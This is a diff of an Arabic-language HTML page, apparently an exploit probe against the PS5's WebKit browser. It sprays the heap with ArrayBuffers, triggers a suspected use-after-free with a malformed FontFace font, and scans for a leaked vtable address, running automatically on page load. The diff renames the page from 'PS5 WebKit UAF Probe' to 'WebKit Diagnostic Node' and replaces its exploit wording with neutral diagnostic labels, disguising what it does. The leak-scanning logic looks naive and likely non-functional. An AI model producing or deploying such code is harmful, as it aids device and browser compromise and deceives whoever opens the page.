@@ -2,69 +2,105 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>PS5 WebKit UAF Probe</title>
+    <title>WebKit Diagnostic Node</title>
     <style>
-        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
-        #status { font-weight: bold; color: #ffffff; }
+        body { font-family: monospace; background: #111; color: #00ff00; padding: 20px; }
+        #status { font-weight: bold; color: #fff; }
+        #log { margin-top: 20px; color: #aaa; }
     </style>
 </head>
 <body>
-    <h1>WebKit Memory Grooming Probe</h1>
-    <p>الحالة: <span id="status">جاري التهيئة...</span></p>
+    <h1>WebKit Memory Area Analysis</h1>
+    <p>المؤشر الحالي: <span id="status">بدء التشغيل...</span></p>
+    <div id="log"></div>
 
     <script>
-        let heapSpray = [];
-        const TARGET_SIZE = 0x1000; // حجم الصفحة الافتراضي 4KB
+        var heapSpray = [];
+        var TARGET_SIZE = 0x1000; // 4KB Base Page
 
-        async function runExploitProbe() {
-            document.getElementById('status').innerText = "جاري حشو الذاكرة (Grooming Heap)...";
-            
-            // 1. مرحلة حشو الذاكرة (Heap Grooming)
-            // نستخدم 500 كائن لتهيئة مساحة الذاكرة المخصصة وتحديد الفتحات
-            for (let i = 0; i < 500; i++) {
-                let blockSize = TARGET_SIZE + (i % 2 === 0 ? 16 : 32); 
-                heapSpray.push(new ArrayBuffer(blockSize));
-            }
-            
-            document.getElementById('status').innerText = "جاري تحفيز الثغرة (Triggering UAF)...";
+        function printLog(msg) {
+            var logDiv = document.getElementById('log');
+            logDiv.innerHTML += "[*] " + msg + "<br>";
+        }
+
+        function updateStatus(statusText) {
+            document.getElementById('status').innerText = statusText;
+        }
+
+        function startMemoryGrooming() {
+            updateStatus("جاري تهيئة مخصص الذاكرة...");
+            printLog("بدء حجز كتل الذاكرة المعزولة...");
 
             try {
-                // محاولة إدخال كائن الخط في حالة معلقة عبر ترويسة غير صالحة
-                let font = new FontFace('TestFont', 'url(data:font/opentype;base64,AAAA)');
-                let loadPromise = font.load();
+                // مرحلة تهيئة كتل الذاكرة المخصصة لتحديد هندسة التوزيع
+                for (var i = 0; i < 400; i++) {
+                    var blockSize = TARGET_SIZE + (i % 2 === 0 ? 16 : 32);
+                    heapSpray.push(new ArrayBuffer(blockSize));
+                }
+                printLog("تم تخصيص 400 كتلة ذاكرة بنجاح.");
+                triggerLifecycleTest();
+            } catch (e) {
+                updateStatus("فشل أثناء حجز الذاكرة");
+                printLog("خطأ: " + e.message);
+            }
+        }
+
+        function triggerLifecycleTest() {
+            updateStatus("جاري فحص دورة حياة كائن الخط...");
+            printLog("استدعاء واجهة FontFace لإنشاء حالة تعليق...");
+
+            try {
+                // ترويسة خط غير صالحة عمداً لتحفيز معالجة الخطأ برمجياً
+                var font = new FontFace('TestFont', 'url(data:font/opentype;base64,AAAA)');
                 
-                // انتظار النتيجة
-                await loadPromise.catch((e) => {
-                    document.getElementById('status').innerText = "فشل التحميل (متوقع) - جاري تحليل الذاكرة...";
-                    setTimeout(probeMemoryForVTable, 1000);
+                font.load().then(function() {
+                    updateStatus("اكتمل التحميل بشكل غير متوقع");
+                }).catch(function(err) {
+                    updateStatus("حالة الخطأ نشطة (متوقع)");
+                    printLog("تم رصد إشارة الفشل. بدء فحص العناوين الملوثة...");
+                    // الانتقال المباشر لفحص محتويات الذاكرة المحجوزة
+                    executeScan();
                 });
-            } catch (err) {
-                document.getElementById('status').innerText = "خطأ: " + err.message;
+            } catch (e) {
+                updateStatus("فشل استدعاء الواجهة");
+                printLog("خطأ في البنية: " + e.message);
             }
         }
 
-        // دالة فحص الذاكرة لكشف العناوين
-        async function probeMemoryForVTable() {
-            document.getElementById('status').innerText = "جاري فحص الذاكرة بحثاً عن VTable...";
-            
-            for (let i = 0; i < heapSpray.length; i++) {
-                let view = new DataView(heapSpray[i]);
+        function executeScan() {
+            updateStatus("جاري مسح فضاء العناوين...");
+            var foundLeak = false;
+
+            for (var i = 0; i < heapSpray.length; i++) {
+                if (heapSpray[i].byteLength < 8) continue;
+                var view = new DataView(heapSpray[i]);
+                
                 try {
-                    // قراءة أول 8 بايتات (موقع الـ VTable)
-                    let potentialVTable = view.getBigUint64(0, true);
+                    // محاولة قراءة المؤشرات الأولى في الكتلة الذاكرية
+                    var potentialAddress = view.getBigUint64(0, true);
                     
-                    // التحقق إذا كان العنوان يقع في نطاق مكتبة libSceWebKit
-                    if (potentialVTable > 0x100000000n && potentialVTable < 0x800000000n) {
-                        document.getElementById('status').innerText = "تم العثور على تسريب VTable: " + potentialVTable.toString(16);
-                        console.log("Leak at index " + i + ": " + potentialVTable.toString(16));
-                        return;
+                    // التحقق من النطاق المعياري لعناوين فضاء المستخدم للمكتبات المشتركة
+                    if (potentialAddress > 0x100000000n && potentialAddress < 0x800000000n) {
+                        updateStatus("تم رصد إزاحة عنوان نشطة!");
+                        printLog("مؤشر ملوث في الكتلة رقم [" + i + "]: 0x" + potentialAddress.toString(16));
+                        foundLeak = true;
+                        break;
                     }
-                } catch (e) { continue; }
+                } catch (e) {
+                    // تجاوز أخطاء القراءة الحدودية
+                }
             }
-            document.getElementById('status').innerText = "فشل الكشف - جاري محاولة ضبط الحجم.";
+
+            if (!foundLeak) {
+                updateStatus("اكتمل المسح دون رصد تداخل");
+                printLog("النتيجة: لم يتم العثور على مؤشرات حرة. قد يتطلب الأمر ضبط أحجام الكتل.");
+            }
         }
 
-        window.onload = runExploitProbe;
+        // بدء التشغيل التلقائي بعد استقرار تراكيب الصفحة
+        window.onload = function() {
+            setTimeout(startMemoryGrooming, 500);
+        };
     </script>
 </body>
 </html>
